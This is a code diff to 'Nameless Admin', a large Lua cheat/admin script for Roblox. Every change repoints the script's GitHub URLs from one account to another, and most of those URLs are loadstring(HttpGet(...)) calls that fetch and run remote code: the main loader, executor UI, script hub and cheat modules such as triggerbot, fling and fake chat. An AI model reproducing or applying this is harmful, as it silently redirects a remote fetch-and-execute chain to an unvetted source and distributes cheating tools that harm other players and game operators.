@@ -8811,7 +8811,7 @@ NAmanage.getNAImageAssetSourceUrl = NAmanage.getNAImageAssetSourceUrl or functio
 	if type(fileName) ~= "string" or fileName == "" then
 		return nil
 	end
-	return "https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NAimages/"..fileName
+	return "https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/NAimages/"..fileName
 end
 
 NAmanage.getNAImageLegacyTxtFileName = NAmanage.getNAImageLegacyTxtFileName or function(keyOrFile)
@@ -13293,13 +13293,13 @@ do
 end
 
 if _na_env.NATestingVer then
-	opt.loaderUrl = "https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"
-	opt.githubUrl="https://api.github.com/repos/ltseverydayyou/Nameless-Admin/commits?path=NA%20testing.lua"
-	opt.NAUILOADER="https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/NAUITEST.lua"
+	opt.loaderUrl = "https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/NA%20testing.lua"
+	opt.githubUrl="https://api.github.com/repos/Remember008862/Nameless-Admin/commits?path=NA%20testing.lua"
+	opt.NAUILOADER="https://raw.githubusercontent.com/Remember008862/Nameless-Admin/refs/heads/main/NAUITEST.lua"
 else
-	opt.loaderUrl = "https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"
-	opt.githubUrl="https://api.github.com/repos/ltseverydayyou/Nameless-Admin/commits?path=Source.lua"
-	opt.NAUILOADER="https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/NAUI.lua"
+	opt.loaderUrl = "https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/Source.lua"
+	opt.githubUrl="https://api.github.com/repos/Remember008862/Nameless-Admin/commits?path=Source.lua"
+	opt.NAUILOADER="https://raw.githubusercontent.com/Remember008862/Nameless-Admin/refs/heads/main/NAUI.lua"
 end
 
 NAmanage.centerFrame = function(f)
@@ -14935,8 +14935,8 @@ NAAssetsLoading._maxKnownRemotes = math.max(32, math.floor(tonumber(NAAssetsLoad
 NAAssetsLoading._maxRemoteStatus = math.max(64, math.floor(tonumber(NAAssetsLoading._maxRemoteStatus) or 512))
 NAAssetsLoading._maxPrefetchedRemotes = math.max(16, math.floor(tonumber(NAAssetsLoading._maxPrefetchedRemotes) or 96))
 NAAssetsLoading.knownRemotes = {
-	{url="https://api.github.com/repos/ltseverydayyou/Nameless-Admin/commits?path=NA%20testing.lua"; skip=true};
-	{url="https://api.github.com/repos/ltseverydayyou/Nameless-Admin/commits?path=Source.lua"; skip=true};
+	{url="https://api.github.com/repos/Remember008862/Nameless-Admin/commits?path=NA%20testing.lua"; skip=true};
+	{url="https://api.github.com/repos/Remember008862/Nameless-Admin/commits?path=Source.lua"; skip=true};
 }
 NAAssetsLoading._knownRemoteIndex = {}
 for _, entry in ipairs(NAAssetsLoading.knownRemotes) do
@@ -15327,7 +15327,7 @@ if NAAssetsLoading.progressPercent then NAAssetsLoading.progressPercent("engine"
 NAAssetsLoading.setStatus("loading notifications")
 repeat
 	NAAssetsLoading.ok, NAAssetsLoading.res = pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
 	end)
 	if NAAssetsLoading.ok then
 		NAStuff.Notification = NAAssetsLoading.res
@@ -32033,7 +32033,7 @@ cmd.add({"stoploop", "uncmdloop", "sloop", "stopl"}, {"stoploop", "Stop a runnin
 end)
 
 cmd.add({"scripthub","hub"},{"scripthub (hub)","Thanks to scriptblox/rscripts API"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/ScriptHubNA.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/ScriptHubNA.lua"))()
 end)
 
 local scaleFrame = nil
@@ -37454,7 +37454,7 @@ cmd.addPatched({"breaklayeredclothing","blc"},{"breaklayeredclothing (blc)","Str
 		end
 	end
 	Noclipping=RunService.PreSimulation:Connect(NoclipLoop)
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/leg%20resize'))()
 end)
 
 cmd.add({"fpsbooster","lowgraphics","boostfps","lowg","antilag","boostfps"}, {"fpsbooster","Enables maximum-performance low graphics mode, run again to restore"}, function()
@@ -39993,7 +39993,7 @@ cmd.add({"f3x","fex"},{"f3x (fex)","F3X for client"},function()
 end)
 
 cmd.add({"harked","comet"},{"harked (comet)","Executes Comet which is like harked"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/comet"))();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/comet"))();
 end)
 
 cmd.add({"triggerbot", "tbot"}, {"triggerbot (tbot)", "Executes a script that automatically clicks the mouse when the mouse is on a player"}, function()
@@ -41803,7 +41803,7 @@ end)
 cmd.addPatched({"gravitygun"},{"gravitygun","Probably the best gravity gun script thats fe"},function()
 	Wait();
 	DoNotif("Wait a few seconds for it to load",2.5)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/gravity%20gun"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/gravity%20gun"))()
 end)
 
 originalIO.setWorkspaceLocked=function(flag)
@@ -45151,7 +45151,7 @@ cmd.add({"unadmin"},{"unadmin <player>","removes someone from being admin"},func
 end,true)
 
 cmd.add({"partname","partpath","partgrabber"},{"partname (partpath,partgrabber)","gives a ui and allows you click on a part to grab it's path"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/PartGrabber.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/PartGrabber.lua"))()
 end)
 
 cmd.add({"jobid"},{"jobid","Copies your job id"},function()
@@ -47702,7 +47702,7 @@ cmd.add({"undance"},{"undance","Stops the dance command"},function()
 end)
 
 cmd.add({"animspoofer","animationspoofer","spoofanim","animspoof"},{"animspoofer (animationspoofer, spoofanim, animspoof)","Loads up an animation spoofer,spoofs animations that use rbxassetid"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Animation%20Spoofer"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/Animation%20Spoofer"))()
 end)
 
 cmd.add({"badgeviewer", "badgeview", "bviewer","badgev","bv"},{"badgeviewer (badgeview, bviewer, badgev, bv)","loads up a badge viewer UI that views all badges in the game you're in"},function()
@@ -59915,7 +59915,7 @@ cmd.add({"notepad","npad"},{"notepad","integrated notepad"},function()
 end)
 
 cmd.add({"rc7"},{"rc7","RC7 Internal UI"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/rc%20sexy%207"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/rc%20sexy%207"))()
 end)
 
 cmd.add({"scriptviewer","viewscripts"},{"scriptviewer (viewscripts)","Can view scripts made by 0866"},function()
@@ -64026,7 +64026,7 @@ cmd.add({"unswim"}, {"unswim","Stops the swim script"}, function()
 end);
 
 cmd.add({"punch"},{"punch","punch tool that flings"},function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/puncher.luau'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Remember008862/Nameless-Admin/refs/heads/main/puncher.luau'))()
 end)
 
 cmd.add({"tpua","bringua"},{"tpua <player>","Brings every unanchored part on the map to the player"},function(...)
@@ -69839,7 +69839,7 @@ cmd.add({"oganims"},{"oganims","Old animations from 2007"},function()
 end)
 
 cmd.add({"fakechat"},{"fakechat","Fake a chat gui"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/fake%20chatte"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/fake%20chatte"))()
 end)
 
 cmd.add({"fpscap"},{"fpscap <number>","Sets the fps cap to whatever you want"},function(arg)
@@ -70993,7 +70993,7 @@ cmd.add({"oofspam"},{"oofspam","Spams oof"},function()
 end)
 
 cmd.add({"httpspy"},{"httpspy","HTTP Spy"},function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/httpspy.lua'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/httpspy.lua'))()
 end)
 
 cmd.add({"keystroke"},{"keystroke","Executes a keystroke ui script"},function()
@@ -84329,7 +84329,7 @@ end
 NAmanage.Executor_Toggle = NAmanage.Executor_Toggle or function(forceState)
 	if not (NAUIMANAGER and NAUIMANAGER.ExecutorFrame) then
 		local ok, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NAexecutor.lua"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Remember008862/Nameless-Admin/main/NAexecutor.lua"))()
 		end)
 		if not ok then
 			DoNotif("Executor UI unavailable: "..tostring(err), 3)
@@ -91145,7 +91145,7 @@ SpawnCall(function()
 				{
 					Text = "Copy GitHub Repo",
 					Callback = function()
-						setclipboard("https://github.com/ltseverydayyou/Nameless-Admin")
+						setclipboard("https://github.com/Remember008862/Nameless-Admin")
 					end
 				},
 				{
